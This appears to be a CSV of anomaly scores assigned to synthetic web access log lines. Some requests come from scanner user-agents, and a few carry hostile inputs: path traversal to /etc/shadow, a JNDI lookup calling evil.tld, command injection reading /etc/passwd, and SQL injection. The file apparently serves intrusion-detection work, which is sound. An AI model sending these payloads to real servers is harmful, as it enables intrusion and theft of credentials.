score_content,score_session,score_fused,score_fused_norm,line
0.2779218852519989,,0.2779218852519989,0.2779218852519989,56.95.147.50 - - [10/Jan/2025:12:45:54 +0000] "GET /index.html HTTP/1.1" 200 4517 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.60138702392578,,27.60138702392578,27.60138702392578,44.69.155.94 - - [10/Jan/2025:12:45:55 +0000] "POST /search?q=router HTTP/1.1" 200 10199 "https://www.google.com/" "curl/7.85.0"
71.79088592529297,,71.79088592529297,71.79088592529297,108.35.107.32 - - [10/Jan/2025:12:45:57 +0000] "OPTIONS /wp-login.php HTTP/1.1" 200 17335 "https://example.com/" "curl/7.85.0"
70.53919219970703,,70.53919219970703,70.53919219970703,176.36.103.253 - - [10/Jan/2025:12:45:58 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 16779 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
36.29512023925781,,36.29512023925781,36.29512023925781,75.151.54.56 - - [10/Jan/2025:12:46:01 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1088 "https://www.google.com/" "curl/7.85.0"
50.5759391784668,,50.5759391784668,50.5759391784668,37.18.177.254 - - [10/Jan/2025:12:46:02 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 13345 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.9491875171661377,,2.9491875171661377,2.9491875171661377,228.124.200.3 - - [10/Jan/2025:12:46:02 +0000] "GET /assets/app.css HTTP/1.1" 301 1341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.5941390991211,,70.5941390991211,70.5941390991211,95.90.247.218 - - [10/Jan/2025:12:46:02 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 14071 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.722911834716797,,24.722911834716797,24.722911834716797,132.110.170.36 - - [10/Jan/2025:12:46:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 19485 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.30915069580078,,73.30915069580078,73.30915069580078,136.59.187.80 - - [10/Jan/2025:12:46:07 +0000] "HEAD /search?q=router HTTP/1.1" 302 4729 "https://twitter.com/" "curl/7.85.0"
130.58087158203125,,130.58087158203125,130.58087158203125,36.64.87.107 - - [10/Jan/2025:12:46:10 +0000] "TRACE /search?q=ssd HTTP/1.1" 304 7988 "https://www.google.com/" "curl/7.85.0"
103.1357192993164,,103.1357192993164,103.1357192993164,220.61.207.105 - - [10/Jan/2025:12:46:11 +0000] "TRACE /cgi-bin/test.cgi HTTP/1.1" 200 16219 "-" "nikto/2.5.0"
96.3115463256836,,96.3115463256836,96.3115463256836,152.196.58.5 - - [10/Jan/2025:12:46:12 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 11490 "https://twitter.com/" "python-requests/2.31.0"
27.62366485595703,,27.62366485595703,27.62366485595703,253.217.17.118 - - [10/Jan/2025:12:46:13 +0000] "POST /search?q=laptop HTTP/1.1" 200 17609 "https://www.google.com/" "dirb/2.22"
104.78508758544922,,104.78508758544922,104.78508758544922,242.91.139.111 - - [10/Jan/2025:12:46:16 +0000] "TRACE /dashboard HTTP/1.1" 200 10811 "https://example.com/" "python-requests/2.31.0"
50.505863189697266,,50.505863189697266,50.505863189697266,114.203.229.45 - - [10/Jan/2025:12:46:19 +0000] "DELETE /search?q=router HTTP/1.1" 200 11037 "https://example.com/" "nikto/2.5.0"
0.2263404279947281,,0.2263404279947281,0.2263404279947281,254.149.197.235 - - [10/Jan/2025:12:46:19 +0000] "GET /assets/app.css HTTP/1.1" 200 18992 "-" "dirb/2.22"
24.717273712158203,,24.717273712158203,24.717273712158203,146.47.142.45 - - [10/Jan/2025:12:46:22 +0000] "GET /search?q=phone HTTP/1.1" 200 5435 "https://www.google.com/" "dirb/2.22"
2.1856882572174072,,2.1856882572174072,2.1856882572174072,109.76.54.131 - - [10/Jan/2025:12:46:22 +0000] "GET / HTTP/1.1" 200 17153 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.505306243896484,,50.505306243896484,50.505306243896484,137.189.190.25 - - [10/Jan/2025:12:46:24 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 16978 "-" "Wget/1.21.2 (linux-gnu)"
3.1036689281463623,,3.1036689281463623,3.1036689281463623,227.114.50.93 - - [10/Jan/2025:12:46:27 +0000] "GET /.git/config HTTP/1.1" 304 10523 "-" "python-requests/2.31.0"
30216.8671875,,30216.8671875,30216.8671875,93.7.139.55 - - [10/Jan/2025:12:46:29 +0000] "OPTIONS /search?q=phone HTTP/1.1" 400 724 "https://example.com/" "python-requests/2.31.0"
4.762669086456299,,4.762669086456299,4.762669086456299,236.222.180.209 - - [10/Jan/2025:12:46:30 +0000] "POST /contact HTTP/1.1" 200 4582 "https://www.google.com/" "python-requests/2.31.0"
104.85098266601562,,104.85098266601562,104.85098266601562,161.162.30.171 - - [10/Jan/2025:12:46:32 +0000] "TRACE /contact HTTP/1.1" 200 11984 "https://twitter.com/" "dirb/2.22"
76.20840454101562,,76.20840454101562,76.20840454101562,192.4.210.195 - - [10/Jan/2025:12:46:35 +0000] "OPTIONS /contact HTTP/1.1" 302 10589 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.93439483642578,,104.93439483642578,104.93439483642578,92.213.10.5 - - [10/Jan/2025:12:46:36 +0000] "TRACE /admin HTTP/1.1" 200 16929 "https://twitter.com/" "nikto/2.5.0"
30146.767578125,,30146.767578125,30146.767578125,98.79.44.173 - - [10/Jan/2025:12:46:39 +0000] "GET /search?q=phone HTTP/1.1" 401 457 "https://www.google.com/" "curl/7.85.0"
96.3275146484375,,96.3275146484375,96.3275146484375,24.7.136.122 - - [10/Jan/2025:12:46:42 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 201 17399 "https://twitter.com/" "nikto/2.5.0"
70.72704315185547,,70.72704315185547,70.72704315185547,212.166.125.98 - - [10/Jan/2025:12:46:43 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 19509 "https://twitter.com/" "curl/7.85.0"
26.263774871826172,,26.263774871826172,26.263774871826172,199.8.6.111 - - [10/Jan/2025:12:46:46 +0000] "DELETE /.env HTTP/1.1" 200 4647 "-" "dirb/2.22"
1.8985087871551514,,1.8985087871551514,1.8985087871551514,186.92.160.215 - - [10/Jan/2025:12:46:46 +0000] "GET /profile HTTP/1.1" 200 11716 "https://twitter.com/" "curl/7.85.0"
27.490053176879883,,27.490053176879883,27.490053176879883,82.239.114.51 - - [10/Jan/2025:12:46:48 +0000] "DELETE /server-status HTTP/1.1" 200 2689 "https://example.com/" "nikto/2.5.0"
27.61097526550293,,27.61097526550293,27.61097526550293,184.179.34.250 - - [10/Jan/2025:12:46:49 +0000] "POST /search?q=laptop HTTP/1.1" 200 13180 "https://example.com/" "dirb/2.22"
107.69715118408203,,107.69715118408203,107.69715118408203,9.177.199.234 - - [10/Jan/2025:12:46:51 +0000] "TRACE /profile HTTP/1.1" 304 16204 "-" "nikto/2.5.0"
47.775390625,,47.775390625,47.775390625,243.134.48.149 - - [10/Jan/2025:12:46:51 +0000] "HEAD /logout HTTP/1.1" 200 183 "-" "sqlmap/1.7.2#stable"
30149.251953125,,30149.251953125,30149.251953125,230.185.121.108 - - [10/Jan/2025:12:46:53 +0000] "DELETE /login HTTP/1.1" 403 789 "https://www.google.com/" "python-requests/2.31.0"
7.669928073883057,,7.669928073883057,7.669928073883057,64.33.114.100 - - [10/Jan/2025:12:46:54 +0000] "POST /logout HTTP/1.1" 304 17659 "https://news.ycombinator.com/" "nikto/2.5.0"
13.423745155334473,,13.423745155334473,13.423745155334473,1.141.145.202 - - [10/Jan/2025:12:46:54 +0000] "PUT /about HTTP/1.1" 200 3243 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8564082384109497,,1.8564082384109497,1.8564082384109497,180.220.53.223 - - [10/Jan/2025:12:46:54 +0000] "GET /dashboard HTTP/1.1" 201 19404 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.319175720214844,,50.319175720214844,50.319175720214844,67.87.31.241 - - [10/Jan/2025:12:46:55 +0000] "HEAD /server-status HTTP/1.1" 302 10053 "https://twitter.com/" "curl/7.85.0"
13.432862281799316,,13.432862281799316,13.432862281799316,28.156.163.222 - - [10/Jan/2025:12:46:55 +0000] "PUT /about HTTP/1.1" 200 5959 "https://twitter.com/" "python-requests/2.31.0"
2.1790177822113037,,2.1790177822113037,2.1790177822113037,110.142.66.242 - - [10/Jan/2025:12:46:58 +0000] "GET / HTTP/1.1" 201 15374 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
127.61051940917969,,127.61051940917969,127.61051940917969,103.224.93.213 - - [10/Jan/2025:12:47:01 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 9635 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.370291709899902,,13.370291709899902,13.370291709899902,157.63.164.168 - - [10/Jan/2025:12:47:04 +0000] "PUT /api/products HTTP/1.1" 200 17036 "-" "nikto/2.5.0"
47.689552307128906,,47.689552307128906,47.689552307128906,18.247.206.126 - - [10/Jan/2025:12:47:06 +0000] "HEAD /contact HTTP/1.1" 200 9116 "https://www.google.com/" "dirb/2.22"
70.49895477294922,,70.49895477294922,70.49895477294922,81.83.147.3 - - [10/Jan/2025:12:47:09 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 4642 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2213791012763977,,0.2213791012763977,0.2213791012763977,240.80.36.70 - - [10/Jan/2025:12:47:11 +0000] "GET /assets/app.css HTTP/1.1" 200 17113 "https://example.com/" "python-requests/2.31.0"
24.710832595825195,,24.710832595825195,24.710832595825195,104.99.130.43 - - [10/Jan/2025:12:47:11 +0000] "GET /search?q=phone HTTP/1.1" 200 3521 "https://news.ycombinator.com/" "curl/7.85.0"
24.733661651611328,,24.733661651611328,24.733661651611328,31.172.133.182 - - [10/Jan/2025:12:47:12 +0000] "GET /search?q=phone HTTP/1.1" 200 9986 "https://twitter.com/" "dirb/2.22"
53.35808181762695,,53.35808181762695,53.35808181762695,9.58.125.119 - - [10/Jan/2025:12:47:12 +0000] "DELETE /api/product?id=123 HTTP/1.1" 301 12587 "https://example.com/" "nikto/2.5.0"
47.703651428222656,,47.703651428222656,47.703651428222656,193.177.83.231 - - [10/Jan/2025:12:47:14 +0000] "HEAD /logout HTTP/1.1" 200 3641 "https://www.google.com/" "dirb/2.22"
4.978901386260986,,4.978901386260986,4.978901386260986,148.229.21.217 - - [10/Jan/2025:12:47:17 +0000] "GET / HTTP/1.1" 302 18026 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.5902214050293,,50.5902214050293,50.5902214050293,243.8.124.25 - - [10/Jan/2025:12:47:18 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 17453 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.62776184082031,,127.62776184082031,127.62776184082031,230.31.216.55 - - [10/Jan/2025:12:47:18 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 15068 "https://news.ycombinator.com/" "python-requests/2.31.0"
73.439453125,,73.439453125,73.439453125,200.184.244.189 - - [10/Jan/2025:12:47:19 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 301 16207 "https://news.ycombinator.com/" "python-requests/2.31.0"
30191.6171875,,30191.6171875,30191.6171875,6.198.247.15 - - [10/Jan/2025:12:47:19 +0000] "HEAD /search?q=headphones HTTP/1.1" 404 669 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2096637338399887,,0.2096637338399887,0.2096637338399887,214.10.47.122 - - [10/Jan/2025:12:47:20 +0000] "GET /assets/app.css HTTP/1.1" 200 13054 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
36.148704528808594,,36.148704528808594,36.148704528808594,218.49.190.206 - - [10/Jan/2025:12:47:23 +0000] "PUT /search?q=headphones HTTP/1.1" 200 14827 "-" "nikto/2.5.0"
70.57478332519531,,70.57478332519531,70.57478332519531,137.198.34.234 - - [10/Jan/2025:12:47:23 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 8218 "-" "python-requests/2.31.0"
4.959025859832764,,4.959025859832764,4.959025859832764,177.14.77.254 - - [10/Jan/2025:12:47:25 +0000] "GET / HTTP/1.1" 301 18059 "https://twitter.com/" "curl/7.85.0"
7.588416576385498,,7.588416576385498,7.588416576385498,142.157.240.137 - - [10/Jan/2025:12:47:28 +0000] "POST /contact HTTP/1.1" 304 2543 "https://news.ycombinator.com/" "curl/7.85.0"
73.38911437988281,,73.38911437988281,73.38911437988281,205.161.136.118 - - [10/Jan/2025:12:47:31 +0000] "OPTIONS /contact HTTP/1.1" 200 2471 "https://example.com/" "python-requests/2.31.0"
130.46368408203125,,130.46368408203125,130.46368408203125,86.231.170.40 - - [10/Jan/2025:12:47:32 +0000] "TRACE /search?q=router HTTP/1.1" 301 10445 "https://twitter.com/" "curl/7.85.0"
13.423547744750977,,13.423547744750977,13.423547744750977,248.242.23.39 - - [10/Jan/2025:12:47:32 +0000] "PUT /login HTTP/1.1" 200 3160 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30122.07421875,,30122.07421875,30122.07421875,177.54.111.144 - - [10/Jan/2025:12:47:33 +0000] "GET /assets/app.css HTTP/1.1" 404 1064 "https://www.google.com/" "sqlmap/1.7.2#stable"
70.58248901367188,,70.58248901367188,70.58248901367188,201.179.219.76 - - [10/Jan/2025:12:47:34 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 9680 "-" "dirb/2.22"
27.765369415283203,,27.765369415283203,27.765369415283203,3.41.162.249 - - [10/Jan/2025:12:47:36 +0000] "DELETE /login HTTP/1.1" 200 14710 "https://twitter.com/" "sqlmap/1.7.2#stable"
36.128074645996094,,36.128074645996094,36.128074645996094,225.176.64.1 - - [10/Jan/2025:12:47:38 +0000] "PUT /search?q=headphones HTTP/1.1" 200 8439 "https://twitter.com/" "python-requests/2.31.0"
0.2417750209569931,,0.2417750209569931,0.2417750209569931,158.121.192.194 - - [10/Jan/2025:12:47:38 +0000] "GET /assets/app.js HTTP/1.1" 200 16556 "-" "Wget/1.21.2 (linux-gnu)"
30126.7578125,,30126.7578125,30126.7578125,65.25.74.234 - - [10/Jan/2025:12:47:40 +0000] "POST /about HTTP/1.1" 401 159 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.674156188964844,,7.674156188964844,7.674156188964844,250.111.147.151 - - [10/Jan/2025:12:47:42 +0000] "POST /login HTTP/1.1" 304 7699 "https://example.com/" "curl/7.85.0"
0.2870297133922577,,0.2870297133922577,0.2870297133922577,141.179.152.151 - - [10/Jan/2025:12:47:43 +0000] "GET /.git/config HTTP/1.1" 200 15264 "https://www.google.com/" "curl/7.85.0"
13.454120635986328,,13.454120635986328,13.454120635986328,251.38.67.168 - - [10/Jan/2025:12:47:44 +0000] "PUT /about HTTP/1.1" 200 12044 "https://twitter.com/" "sqlmap/1.7.2#stable"
1.873421549797058,,1.873421549797058,1.873421549797058,10.50.77.92 - - [10/Jan/2025:12:47:44 +0000] "GET /contact HTTP/1.1" 200 4589 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.89691925048828,,104.89691925048828,104.89691925048828,199.200.225.220 - - [10/Jan/2025:12:47:47 +0000] "TRACE /logout HTTP/1.1" 200 16128 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
36.129066467285156,,36.129066467285156,36.129066467285156,158.254.136.254 - - [10/Jan/2025:12:47:48 +0000] "PUT /search?q=headphones HTTP/1.1" 200 8718 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30194.060546875,,30194.060546875,30194.060546875,97.156.242.230 - - [10/Jan/2025:12:47:49 +0000] "OPTIONS /logout HTTP/1.1" 401 498 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.22246694564819336,,0.22246694564819336,0.22246694564819336,57.7.65.16 - - [10/Jan/2025:12:47:49 +0000] "GET /assets/app.js HTTP/1.1" 200 10223 "https://twitter.com/" "nikto/2.5.0"
104.89506530761719,,104.89506530761719,104.89506530761719,154.134.187.150 - - [10/Jan/2025:12:47:50 +0000] "TRACE /login HTTP/1.1" 200 4955 "https://www.google.com/" "sqlmap/1.7.2#stable"
7.684210300445557,,7.684210300445557,7.684210300445557,188.86.156.118 - - [10/Jan/2025:12:47:53 +0000] "POST /about HTTP/1.1" 302 207 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.724767684936523,,24.724767684936523,24.724767684936523,178.118.2.194 - - [10/Jan/2025:12:47:53 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7600 "https://news.ycombinator.com/" "dirb/2.22"
27.526288986206055,,27.526288986206055,27.526288986206055,185.231.124.211 - - [10/Jan/2025:12:47:54 +0000] "GET /search?q=camera HTTP/1.1" 304 4820 "https://example.com/" "curl/7.85.0"
104.9344711303711,,104.9344711303711,104.9344711303711,208.101.114.29 - - [10/Jan/2025:12:47:54 +0000] "TRACE /admin HTTP/1.1" 200 16958 "https://www.google.com/" "curl/7.85.0"
73.35004425048828,,73.35004425048828,73.35004425048828,197.179.79.39 - - [10/Jan/2025:12:47:56 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9465 "https://twitter.com/" "nikto/2.5.0"
36.225006103515625,,36.225006103515625,36.225006103515625,233.132.228.38 - - [10/Jan/2025:12:47:59 +0000] "PUT /search?q=laptop HTTP/1.1" 200 19542 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.20862020552158356,,0.20862020552158356,0.20862020552158356,174.250.216.228 - - [10/Jan/2025:12:48:02 +0000] "GET /assets/app.css HTTP/1.1" 201 13273 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
36.13482666015625,,36.13482666015625,36.13482666015625,111.74.146.121 - - [10/Jan/2025:12:48:04 +0000] "PUT /search?q=headphones HTTP/1.1" 200 10388 "-" "curl/7.85.0"
47.66842269897461,,47.66842269897461,47.66842269897461,200.142.11.62 - - [10/Jan/2025:12:48:07 +0000] "HEAD /contact HTTP/1.1" 200 3006 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.22548805177211761,,0.22548805177211761,0.22548805177211761,27.220.236.98 - - [10/Jan/2025:12:48:09 +0000] "GET /assets/app.css HTTP/1.1" 200 18662 "https://twitter.com/" "python-requests/2.31.0"
50.55062484741211,,50.55062484741211,50.55062484741211,183.246.69.103 - - [10/Jan/2025:12:48:09 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 5295 "https://example.com/" "curl/7.85.0"
130.5645294189453,,130.5645294189453,130.5645294189453,245.209.232.87 - - [10/Jan/2025:12:48:12 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 16839 "-" "sqlmap/1.7.2#stable"
50.547996520996094,,50.547996520996094,50.547996520996094,244.21.1.165 - - [10/Jan/2025:12:48:12 +0000] "DELETE /search?q=phone HTTP/1.1" 200 18566 "https://news.ycombinator.com/" "nikto/2.5.0"
104.84733581542969,,104.84733581542969,104.84733581542969,15.135.41.215 - - [10/Jan/2025:12:48:15 +0000] "TRACE /profile HTTP/1.1" 200 10862 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
1.8385798931121826,,1.8385798931121826,1.8385798931121826,2.92.215.38 - - [10/Jan/2025:12:48:16 +0000] "GET /api/products HTTP/1.1" 200 2777 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
96.3267822265625,,96.3267822265625,96.3267822265625,48.27.51.222 - - [10/Jan/2025:12:48:18 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 15520 "https://example.com/" "python-requests/2.31.0"
0.20672009885311127,,0.20672009885311127,0.20672009885311127,164.214.234.22 - - [10/Jan/2025:12:48:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12111 "https://www.google.com/" "nikto/2.5.0"
11.963824272155762,,11.963824272155762,11.963824272155762,104.133.59.50 - - [10/Jan/2025:12:48:19 +0000] "PUT /.env HTTP/1.1" 200 966 "https://news.ycombinator.com/" "curl/7.85.0"
13.23775577545166,,13.23775577545166,13.23775577545166,9.78.9.250 - - [10/Jan/2025:12:48:21 +0000] "PUT /server-status HTTP/1.1" 200 18851 "https://twitter.com/" "sqlmap/1.7.2#stable"
127.7367935180664,,127.7367935180664,127.7367935180664,47.47.232.186 - - [10/Jan/2025:12:48:23 +0000] "TRACE /api/product?id=123 HTTP/1.1" 201 10281 "https://www.google.com/" "curl/7.85.0"
0.18797703087329865,,0.18797703087329865,0.18797703087329865,253.188.91.32 - - [10/Jan/2025:12:48:23 +0000] "GET /assets/app.css HTTP/1.1" 200 6677 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30135.294921875,,30135.294921875,30135.294921875,75.16.128.66 - - [10/Jan/2025:12:48:25 +0000] "PUT /logout HTTP/1.1" 403 718 "https://example.com/" "dirb/2.22"
96.1534423828125,,96.1534423828125,96.1534423828125,86.12.144.162 - - [10/Jan/2025:12:48:26 +0000] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 14855 "-" "sqlmap/1.7.2#stable"
27.512115478515625,,27.512115478515625,27.512115478515625,5.124.58.219 - - [10/Jan/2025:12:48:26 +0000] "DELETE /server-status HTTP/1.1" 200 9218 "-" "python-requests/2.31.0"
36.21482849121094,,36.21482849121094,36.21482849121094,26.252.148.136 - - [10/Jan/2025:12:48:29 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9033 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.38638305664062,,73.38638305664062,73.38638305664062,143.185.148.93 - - [10/Jan/2025:12:48:29 +0000] "OPTIONS /api/products HTTP/1.1" 200 10524 "https://www.google.com/" "curl/7.85.0"
